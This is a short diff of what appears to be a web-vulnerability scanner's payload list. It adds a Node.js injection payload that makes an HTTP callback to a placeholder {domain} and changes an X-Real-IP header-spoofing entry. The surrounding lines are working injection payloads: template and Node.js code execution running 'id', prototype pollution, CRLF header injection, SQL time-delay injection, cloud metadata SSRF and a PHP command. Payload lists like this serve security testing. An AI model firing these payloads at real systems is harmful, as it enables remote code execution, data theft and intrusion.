@@ -21,6 +21,7 @@ undefined
 ${class.getResource("").getPath()}
 __init__.__globals__["{module}"].config
 ${global.process.mainModule.require('child_process').execSync('id')}
+${global.process.mainModule.require('http').get({host:'{domain}', port:80, path:'/callback'})}
 }});console.log("{canary}");// 
 constructor.constructor('alert("{canary}")')()
 this.constructor.constructor("return global")().process
@@ -48,6 +49,6 @@ SLEEP(10) /*' or SLEEP(10) or '" or SLEEP(10) or "*/
 {"constructor":{"prototype":{"isAdmin":true}}}
 ","X-Injected-Header":"{canary}
 %0a%0dX-Injected-Header: {canary}
-%0aX-Real-IP: 127.0.0.1
+%0aX-Real-IP: {domain}
 http://169.254.169.254/latest/meta-data/
 <?php echo `id`; ?>
